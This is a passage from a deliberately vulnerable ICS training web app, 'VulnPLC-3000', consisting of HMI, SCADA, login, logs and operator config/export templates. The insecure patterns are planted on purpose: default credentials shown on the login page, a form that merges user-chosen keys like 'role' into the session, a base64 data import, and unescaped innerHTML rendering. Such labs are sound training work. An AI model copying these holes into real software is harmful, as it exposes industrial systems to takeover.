                        <button class="control-btn" onclick="controlAction('tank', 'open_valve')">OPEN VALVE</button>
                        <button class="control-btn" onclick="controlAction('tank', 'close_valve')">CLOSE VALVE</button>
                    </div>
                </div>

                <!-- Pressure System -->
                <div class="equipment">
                    <h3>COMP-001: Air Compressor</h3>
                    <div class="gauge">
                        <div class="gauge-circle">
                            <div class="gauge-value" id="pressureValue">80 PSI</div>
                        </div>
                        <div class="gauge-label">PRESSURE</div>
                    </div>

                    <div class="indicator">
                        <div class="indicator-light" id="compressorLight"></div>
                        <span>COMPRESSOR</span>
                    </div>

                    <div class="indicator">
                        <div class="indicator-light" id="reliefValveLight"></div>
                        <span>RELIEF VALVE</span>
                    </div>

                    <div class="control-panel">
                        <button class="control-btn" onclick="controlAction('pressure', 'start_compressor')">START COMPRESSOR</button>
                        <button class="control-btn danger" onclick="controlAction('pressure', 'stop_compressor')">STOP COMPRESSOR</button>
                        <button class="control-btn danger" onclick="controlAction('pressure', 'open_relief')">OPEN RELIEF</button>
                    </div>
                </div>

                <!-- Temperature System -->
                <div class="equipment">
                    <h3>REACTOR-001: Heat Exchanger</h3>
                    <div class="gauge">
                        <div class="gauge-circle">
                            <div class="gauge-value" id="tempValue">20Â°C</div>
                        </div>
                        <div class="gauge-label">TEMPERATURE</div>
                    </div>

                    <div class="indicator">
                        <div class="indicator-light" id="heaterLight"></div>
                        <span>HEATER</span>
                    </div>

                    <div class="indicator">
                        <div class="indicator-light" id="coolingLight"></div>
                        <span>COOLING</span>
                    </div>

                    <div class="control-panel">
                        <button class="control-btn" onclick="controlAction('temperature', 'heater_on')">HEATER ON</button>
                        <button class="control-btn danger" onclick="controlAction('temperature', 'heater_off')">HEATER OFF</button>
                        <button class="control-btn" onclick="controlAction('temperature', 'cooling_on')">COOLING ON</button>
                        <button class="control-btn danger" onclick="controlAction('temperature', 'cooling_off')">COOLING OFF</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="sidebar">
            <!-- Alarm Panel -->
            <div class="alarm-panel">
                <h2>
                    <span>âš ï¸ ACTIVE ALARMS</span>
                    <span style="margin-left: auto;" id="alarmCount">0</span>
                </h2>
                <div id="alarmList">
                    <p style="color: #0f0; text-align: center; padding: 20px;">No active alarms</p>
                </div>
            </div>

            <!-- Statistics Panel -->
            <div class="stats-panel">
                <h2>System Statistics</h2>
                <div class="stat-row">
                    <span class="stat-label">Tank Level:</span>
                    <span class="stat-value" id="statTankLevel">50.0%</span>
                </div>
                <div class="stat-row">
                    <span class="stat-label">Pressure:</span>
                    <span class="stat-value" id="statPressure">80.0 PSI</span>
                </div>
                <div class="stat-row">
                    <span class="stat-label">Temperature:</span>
                    <span class="stat-value" id="statTemp">20.0Â°C</span>
                </div>
                <div class="stat-row">
                    <span class="stat-label">Pump Status:</span>
                    <span class="stat-value" id="statPump">OFF</span>
                </div>
                <div class="stat-row">
                    <span class="stat-label">Safety Status:</span>
                    <span class="stat-value" id="statSafety">NORMAL</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Update process data every second
        function updateProcessData() {
            fetch('/api/process_data')
                .then(response => response.json())
                .then(data => {
                    // Update tank
                    const tankLevel = Math.round(data.tank.level);
                    document.getElementById('tankLevel').style.height = tankLevel + '%';
                    document.getElementById('tankLevelText').textContent = tankLevel + '%';
                    document.getElementById('valvePosition').textContent = Math.round(data.tank.valve_position);
                    document.getElementById('pumpLight').className = 'indicator-light ' + (data.tank.pump_running ? 'on' : 'off');
                    document.getElementById('valveLight').className = 'indicator-light ' + (data.tank.valve_position > 50 ? 'on' : 'off');

                    // Update pressure
                    const pressure = Math.round(data.pressure.value);
                    document.getElementById('pressureValue').textContent = pressure + ' PSI';
                    document.getElementById('compressorLight').className = 'indicator-light ' + (data.pressure.compressor_running ? 'on' : 'off');
                    document.getElementById('reliefValveLight').className = 'indicator-light ' + (data.pressure.relief_valve_open ? 'on' : 'off');

                    // Update temperature
                    const temp = Math.round(data.temperature.value);
                    document.getElementById('tempValue').textContent = temp + 'Â°C';
                    document.getElementById('heaterLight').className = 'indicator-light ' + (data.temperature.heater_on ? 'on' : 'off');
                    document.getElementById('coolingLight').className = 'indicator-light ' + (data.temperature.cooling_on ? 'on' : 'off');

                    // Update stats panel
                    document.getElementById('statTankLevel').textContent = tankLevel + '%';
                    document.getElementById('statPressure').textContent = pressure + ' PSI';
                    document.getElementById('statTemp').textContent = temp + 'Â°C';
                    document.getElementById('statPump').textContent = data.tank.pump_running ? 'ON' : 'OFF';

                    // Check for emergency shutdown
                    if (data.safety.shutdown_active) {
                        document.getElementById('emergencyBanner').classList.add('show');
                        document.getElementById('systemStatus').className = 'status-dot red';
                        document.getElementById('systemStatusText').textContent = 'EMERGENCY';
                        document.getElementById('statSafety').textContent = 'EMERGENCY SHUTDOWN';
                        document.getElementById('statSafety').style.color = '#ff0000';
                    } else {
                        document.getElementById('emergencyBanner').classList.remove('show');
                        document.getElementById('systemStatus').className = 'status-dot green';
                        document.getElementById('systemStatusText').textContent = 'OPERATIONAL';
                        document.getElementById('statSafety').textContent = 'NORMAL';
                        document.getElementById('statSafety').style.color = '#00ff00';
                    }

                    // Color code gauges based on values
                    if (data.tank.overflow) {
                        document.getElementById('tankLevel').style.background = 'linear-gradient(0deg, #f00, #f80)';
                    } else if (data.tank.low_level) {
                        document.getElementById('tankLevel').style.background = 'linear-gradient(0deg, #ff0, #f80)';
                    } else {
                        document.getElementById('tankLevel').style.background = 'linear-gradient(0deg, #00f, #0ff)';
                    }

                    if (data.pressure.high_alarm) {
                        document.getElementById('pressureValue').style.color = '#ff0000';
                    } else if (data.pressure.low_alarm) {
                        document.getElementById('pressureValue').style.color = '#ffff00';
                    } else {
                        document.getElementById('pressureValue').style.color = '#00ff00';
                    }

                    if (data.temperature.high_alarm) {
                        document.getElementById('tempValue').style.color = '#ff0000';
                    } else {
                        document.getElementById('tempValue').style.color = '#00ff00';
                    }
                })
                .catch(error => {
                    console.error('Error fetching process data:', error);
                    document.getElementById('commStatus').className = 'status-dot red';
                });
        }

        // Update alarms
        function updateAlarms() {
            fetch('/api/alarms')
                .then(response => response.json())
                .then(alarms => {
                    const alarmList = document.getElementById('alarmList');
                    document.getElementById('alarmCount').textContent = alarms.length;

                    if (alarms.length === 0) {
                        alarmList.innerHTML = '<p style="color: #0f0; text-align: center; padding: 20px;">No active alarms</p>';
                    } else {
                        alarmList.innerHTML = alarms.map(alarm => {
                            const severityClass = alarm.severity.toLowerCase();
                            return `
                                <div class="alarm-item ${severityClass}">
                                    <div style="font-weight: bold; margin-bottom: 5px;">[${alarm.severity}] ${alarm.system}</div>
                                    <div style="font-size: 14px;">${alarm.message}</div>
                                    <div style="font-size: 12px; color: #aaa; margin-top: 5px;">${alarm.timestamp}</div>
                                </div>
                            `;
                        }).join('');
                    }
                });
        }

        // Control action
        function controlAction(system, action) {
            fetch(`/api/control/${system}/${action}`, { method: 'POST' })
                .then(response => response.json())
                .then(result => {
                    if (!result.success) {
                        alert('Control action failed: ' + result.error);
                    }
                })
                .catch(error => {
                    alert('Control action failed: ' + error);
                });
        }

        // Update clock
        function updateClock() {
            const now = new Date();
            document.getElementById('currentTime').textContent = now.toLocaleTimeString();
        }

        // Initialize
        updateProcessData();
        updateAlarms();
        updateClock();

        // Set intervals
        setInterval(updateProcessData, 1000);  // 1 second
        setInterval(updateAlarms, 2000);       // 2 seconds
        setInterval(updateClock, 1000);        // 1 second
    </script>
</body>
</html>



================================================================================
FILE: templates/hmi.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>HMI - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1e1e1e;
            color: #fff;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1400px;
            margin: 20px auto;
            padding: 0 20px;
        }
        .grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
            margin-top: 20px;
        }
        .card {
            background: #2a2a2a;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #00d4ff;
            border-bottom: 2px solid #00d4ff;
            padding-bottom: 10px;
        }
        .process-diagram {
            position: relative;
            height: 500px;
            background: #1a1a1a;
            border-radius: 10px;
            border: 2px solid #444;
        }
        .tank {
            position: absolute;
            left: 50%;
            top: 50px;
            transform: translateX(-50%);
            width: 200px;
            height: 300px;
            border: 3px solid #00d4ff;
            border-radius: 10px;
            overflow: hidden;
            background: #0a2a3a;
        }
        .tank-fill {
            position: absolute;
            bottom: 0;
            width: 100%;
            background: linear-gradient(180deg, #00d4ff 0%, #0080ff 100%);
            transition: height 0.5s ease;
        }
        .tank-label {
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            font-weight: bold;
            color: #fff;
            z-index: 10;
        }
        .tank-value {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 36px;
            font-weight: bold;
            color: #fff;
            z-index: 10;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .pump {
            position: absolute;
            left: 20%;
            bottom: 50px;
            width: 80px;
            height: 80px;
            background: #333;
            border: 3px solid #666;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        .pump.on {
            border-color: #00ff00;
            background: #003300;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        .valve {
            position: absolute;
            right: 20%;
            bottom: 50px;
            width: 60px;
            height: 60px;
            background: #333;
            border: 3px solid #666;
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        .valve.open {
            border-color: #00ff00;
            background: #003300;
        }
        .sensor {
            background: #333;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border-left: 4px solid #00d4ff;
        }
        .sensor h3 {
            font-size: 14px;
            color: #aaa;
            margin-bottom: 5px;
        }
        .sensor .value {
            font-size: 32px;
            font-weight: bold;
            color: #00ff00;
        }
        .sensor.warning .value { color: #ffaa00; }
        .sensor.critical .value { color: #ff0000; }
        .controls {
            display: grid;
            gap: 15px;
        }
        .control-btn {
            padding: 15px;
            background: #444;
            border: 2px solid #666;
            border-radius: 8px;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s;
        }
        .control-btn:hover {
            background: #555;
            border-color: #00d4ff;
        }
        .control-btn.active {
            background: #003300;
            border-color: #00ff00;
        }
        .control-btn.disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .control-btn.disabled:hover {
            background: #444;
            border-color: #666;
        }
        .status-bar {
            background: #1a1a1a;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top: 2px solid #444;
        }
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .led {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #00ff00;
            box-shadow: 0 0 10px #00ff00;
            animation: blink 2s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ–¥ï¸ HMI - Human Machine Interface</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/scada">SCADA</a>
            <a href="/process">Process</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="grid">
            <div>
                <div class="card">
                    <h2>Process Visualization</h2>
                    <div class="process-diagram">
                        <div class="tank">
                            <div class="tank-label">TANK-001</div>
                            <div class="tank-value" id="tank-level">50%</div>
                            <div class="tank-fill" id="tank-fill" style="height: 50%;"></div>
                        </div>

                        <div class="pump" id="pump">
                            ðŸ’§
                        </div>

                        <div class="valve" id="valve">
                            ðŸ”§
                        </div>
                    </div>
                </div>
            </div>

            <div>
                <div class="card">
                    <h2>Live Sensors</h2>
                    <div class="sensor" id="sensor-level">
                        <h3>Tank Level</h3>
                        <div class="value">50.0%</div>
                    </div>
                    <div class="sensor" id="sensor-temp">
                        <h3>Temperature</h3>
                        <div class="value">25.0Â°C</div>
                    </div>
                    <div class="sensor" id="sensor-pressure">
                        <h3>Pressure</h3>
                        <div class="value">101.3 kPa</div>
                    </div>
                    <div class="sensor" id="sensor-flow">
                        <h3>Flow Rate</h3>
                        <div class="value">15.5 L/min</div>
                    </div>
                </div>

                <div class="card" style="margin-top: 20px;">
                    <h2>Equipment Control</h2>
                    {% if role == 'guest' %}
                    <div style="background: #444; padding: 15px; border-radius: 5px; margin-bottom: 15px; color: #ffaa00;">
                        <strong>âš ï¸ Read-Only Mode</strong><br>
                        Guest users can view but not control equipment. Login as operator or admin to control.
                    </div>
                    {% endif %}
                    <div class="controls">
                        <div class="control-btn {% if role == 'guest' %}disabled{% endif %}" id="btn-pump" onclick="{% if role != 'guest' %}togglePump(){% else %}showGuestWarning(){% endif %}">
                            <strong>PUMP</strong><br>
                            <span id="pump-status">ON</span>
                        </div>
                        <div class="control-btn {% if role == 'guest' %}disabled{% endif %}" id="btn-valve" onclick="{% if role != 'guest' %}toggleValve(){% else %}showGuestWarning(){% endif %}">
                            <strong>VALVE</strong><br>
                            <span id="valve-status">CLOSED</span>
                        </div>
                        <div class="control-btn {% if role == 'guest' %}disabled{% endif %}" onclick="{% if role != 'guest' %}resetTank(){% else %}showGuestWarning(){% endif %}">
                            <strong>RESET TANK</strong><br>
                            <span>Set to 50%</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="status-bar">
        <div class="status-indicator">
            <div class="led"></div>
            <span>System Online</span>
        </div>
        <div>User: {{ username }} ({{ role }})</div>
        <div id="last-update">Last update: --:--:--</div>
    </div>

    <script>
        let pumpStatus = true;
        let valveStatus = false;
        const userRole = '{{ role }}';

        function showGuestWarning() {
            alert('âš ï¸ Access Denied\n\nGuest users have read-only access.\nLogin as operator or admin to control equipment.');
        }

        function updateProcess() {
            fetch('/api/process/status')
                .then(r => r.json())
                .then(data => {
                    // Update tank
                    const level = data.tank_level.toFixed(1);
                    document.getElementById('tank-level').textContent = level + '%';
                    document.getElementById('tank-fill').style.height = level + '%';

                    // Update sensors
                    updateSensor('sensor-level', data.tank_level, '%', 90, 10);
                    updateSensor('sensor-temp', data.temperature, 'Â°C', 80, 0);
                    updateSensor('sensor-pressure', data.pressure, ' kPa', 140, 0);
                    updateSensor('sensor-flow', data.flow_rate, ' L/min', 45, 0);

                    // Update equipment
                    pumpStatus = data.pump_status;
                    valveStatus = data.valve_status;

                    document.getElementById('pump').className = pumpStatus ? 'pump on' : 'pump';
                    document.getElementById('valve').className = valveStatus ? 'valve open' : 'valve';
                    document.getElementById('pump-status').textContent = pumpStatus ? 'ON' : 'OFF';
                    document.getElementById('valve-status').textContent = valveStatus ? 'OPEN' : 'CLOSED';

                    if (pumpStatus) {
                        document.getElementById('btn-pump').classList.add('active');
                    } else {
                        document.getElementById('btn-pump').classList.remove('active');
                    }

                    if (valveStatus) {
                        document.getElementById('btn-valve').classList.add('active');
                    } else {
                        document.getElementById('btn-valve').classList.remove('active');
                    }

                    // Update timestamp
                    const now = new Date();
                    document.getElementById('last-update').textContent =
                        'Last update: ' + now.toLocaleTimeString();
                });
        }

        function updateSensor(id, value, unit, criticalHigh, criticalLow) {
            const element = document.getElementById(id);
            const valueEl = element.querySelector('.value');
            valueEl.textContent = value.toFixed(1) + unit;

            // Set warning/critical states
            element.className = 'sensor';
            if (value > criticalHigh) {
                element.classList.add('critical');
            } else if (value < criticalLow && criticalLow > 0) {
                element.classList.add('critical');
            } else if (value > criticalHigh * 0.9) {
                element.classList.add('warning');
            }
        }

        function togglePump() {
            pumpStatus = !pumpStatus;
            controlEquipment('pump', pumpStatus);
        }

        function toggleValve() {
            valveStatus = !valveStatus;
            controlEquipment('valve', valveStatus);
        }

        function resetTank() {
            controlEquipment('reset_tank', true);
        }

        function controlEquipment(action, value) {
            fetch('/api/process/control', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({action: action, value: value})
            })
            .then(r => {
                if (!r.ok) {
                    return r.json().then(err => {
                        throw new Error(err.error || 'Control failed');
                    });
                }
                return r.json();
            })
            .then(data => {
                updateProcess();
            })
            .catch(err => {
                alert('Control Error: ' + err.message);
                console.error('Control error:', err);
            });
        }

        // Update every 2 seconds
        setInterval(updateProcess, 2000);
        updateProcess();
    </script>
</body>
</html>



================================================================================
FILE: templates/login.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>PLC Login - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 400px;
        }
        .plc-header {
            text-align: center;
            margin-bottom: 30px;
        }
        .plc-header h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 5px;
        }
        .plc-header p {
            color: #666;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 500;
        }
        button:hover {
            background: #5568d3;
        }
        .error {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #fcc;
        }
        .info-box {
            background: #e3f2fd;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-size: 13px;
            color: #1976d2;
        }
        .info-box strong { display: block; margin-bottom: 5px; }
        .credentials { font-family: monospace; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="plc-header">
            <h1>ðŸ­ VulnPLC-3000</h1>
            <p>Industrial Control System Login</p>
        </div>

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form method="POST" action="/login">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" required autofocus>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>

        <div class="info-box">
            <strong>Default Credentials (For Testing):</strong>
            <div class="credentials">
                admin / admin<br>
                operator / operator123<br>
                guest / guest
            </div>
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/logs.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>System Logs - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 15px;
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background: #3498db;
            color: white;
            font-weight: 500;
        }
        tr:hover { background: #f8f9fa; }
        .timestamp { font-family: monospace; color: #7f8c8d; }
        .action { font-weight: 500; }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ­ VulnPLC-3000 - System Logs</h1>
        <div>
            <a href="/admin">Admin</a>
            <a href="/dashboard">Dashboard</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Audit Logs (Last 100 entries)</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Timestamp</th>
                        <th>User</th>
                        <th>Action</th>
                        <th>Details</th>
                    </tr>
                </thead>
                <tbody>
                    {% for log in logs %}
                    <tr>
                        <td>{{ log[0] }}</td>
                        <td class="timestamp">{{ log[1] }}</td>
                        <td>{{ log[2] }}</td>
                        <td class="action">{{ log[3] }}</td>
                        <td>{{ log[4] }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/operator_config.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Settings - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1000px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #e67e22;
            padding-bottom: 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #2c3e50;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            padding: 12px 30px;
            background: #e67e22;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover { background: #d35400; }
        .info-box {
            background: #e8f4f8;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #3498db;
        }
        .warning {
            background: #fff3cd;
            border-left-color: #ffc107;
            color: #856404;
        }
        .config-display {
            background: #f4f4f4;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            margin-bottom: 20px;
        }
        .success {
            background: #d4edda;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #28a745;
            color: #155724;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>âš™ï¸ User Settings</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/operator/logs">My Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Current Configuration</h2>

            <div class="info-box">
                <strong>ðŸ’¡ Info:</strong> View and update your user preferences and system settings.
            </div>

            {% if current_config %}
            <div class="config-display">
                <strong>Your Current Settings:</strong><br><br>
                {% for key, value in current_config.items() %}
                <div style="margin-bottom: 5px;">
                    <strong>{{ key }}:</strong> {{ value }}
                </div>
                {% endfor %}
            </div>
            {% endif %}

            {% if success %}
            <div class="success">
                <strong>âœ“ Success!</strong> Your settings have been updated.
            </div>
            {% endif %}
        </div>

        <div class="card">
            <h2>Update Settings</h2>

            <form method="POST" action="/operator/config">
                <div class="form-group">
                    <label>Display Name</label>
                    <input type="text" name="display_name" value="{{ current_config.get('username', '') }}" placeholder="Your display name">
                </div>

                <div class="form-group">
                    <label>Email Notifications</label>
                    <select name="email_notifications">
                        <option value="enabled">Enabled</option>
                        <option value="disabled">Disabled</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Dashboard Theme</label>
                    <select name="theme">
                        <option value="light">Light</option>
                        <option value="dark">Dark</option>
                        <option value="auto">Auto</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Timezone</label>
                    <select name="timezone">
                        <option value="UTC">UTC</option>
                        <option value="America/New_York">Eastern Time</option>
                        <option value="America/Chicago">Central Time</option>
                        <option value="America/Los_Angeles">Pacific Time</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Language</label>
                    <select name="language">
                        <option value="en">English</option>
                        <option value="es">Spanish</option>
                        <option value="fr">French</option>
                        <option value="de">German</option>
                    </select>
                </div>

                <button type="submit">ðŸ’¾ Save Settings</button>
            </form>
        </div>

        <div class="card">
            <h2>Advanced Configuration</h2>

            <div class="info-box warning">
                <strong>âš ï¸ Advanced Users:</strong> You can set custom session parameters below. Use with caution.
            </div>

            <form method="POST" action="/operator/config">
                <div class="form-group">
                    <label>Custom Parameter Name</label>
                    <input type="text" name="custom_key" placeholder="e.g., role, user_id, permissions">
                </div>

                <div class="form-group">
                    <label>Custom Parameter Value</label>
                    <input type="text" name="custom_value" placeholder="Value">
                </div>

                <button type="submit" style="background: #95a5a6;">âš¡ Apply Custom Setting</button>
            </form>

            <p style="margin-top: 15px; color: #7f8c8d; font-size: 13px;">
                <strong>Note:</strong> Custom parameters are merged directly into your session configuration.
            </p>
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/operator_export.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Export/Import Data - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1000px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #f39c12;
            padding-bottom: 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #2c3e50;
        }
        textarea, input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            font-family: 'Courier New', monospace;
        }
        textarea {
            min-height: 200px;
            resize: vertical;
        }
        button {
            padding: 12px 30px;
            background: #f39c12;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-right: 10px;
        }
        button:hover { background: #e67e22; }
        .info-box {
            background: #e8f4f8;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #3498db;
        }
        .warning {
            background: #fff3cd;
            border-left-color: #ffc107;
            color: #856404;
        }
        code {
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        .result {
            background: #d4edda;
            padding: 20px;
            border-radius: 5px;
            border-left: 4px solid #28a745;
            margin-top: 20px;
        }
        .export-btn {
            background: #1abc9c;
        }
        .export-btn:hover {
            background: #16a085;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ’¾ Export/Import Data</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/operator/logs">My Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Export System Data</h2>

            <div class="info-box">
                <strong>ðŸ’¡ Tip:</strong> Export your configuration and process data for backup purposes.
            </div>

            <form method="POST" action="/operator/export">
                <button type="submit" class="export-btn">ðŸ“¥ Export Current State</button>
            </form>

            {% if export_data %}
            <div class="result">
                <strong>âœ“ Export Successful!</strong>
                <p style="margin-top: 10px;">Copy the data below for backup:</p>
                <textarea readonly style="margin-top: 10px;">{{ export_data }}</textarea>
            </div>
            {% endif %}
        </div>

        <div class="card">
            <h2>Import System Data</h2>

            <div class="info-box warning">
                <strong>âš ï¸ Warning:</strong> Only import data that you have previously exported. Importing invalid data may cause system errors.
            </div>

            <form method="POST" action="/operator/import">
                <div class="form-group">
                    <label>Paste Exported Data (Base64 format)</label>
                    <textarea name="data" placeholder="Paste your exported data here..." required></textarea>
                </div>

                <button type="submit">ðŸ“¤ Import Data</button>
            </form>

            {% if import_result %}
            <div class="result">
                <strong>âœ“ Import Successful!</strong>
                <p style="margin-top: 10px;">{{ import_result }}</p>
            </div>
            {% endif %}

            {% if error %}
            <div style="background: #f8d7da; padding: 20px; border-radius: 5px; border-left: 4px solid #dc3545; margin-top: 20px; color: #721c24;">
                <strong>âœ— Error:</strong> {{ error }}
            </div>
            {% endif %}
        </div>

        <div class="card">
            <h2>Advanced Usage</h2>
            <p style="margin-bottom: 15px;">For programmatic access, you can use the API endpoints:</p>

            <pre style="background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto;"># Export data
curl -X POST http://localhost:5000/operator/export \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Accept: application/json"

# Import data
curl -X POST http://localhost:5000/operator/import \
  -H "Cookie: session=YOUR_SESSION" \
  -d "data=YOUR_BASE64_DATA"</pre>
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/operator_logs.html
================================================================================
<!DOCTYPE html>
<html>
<head>
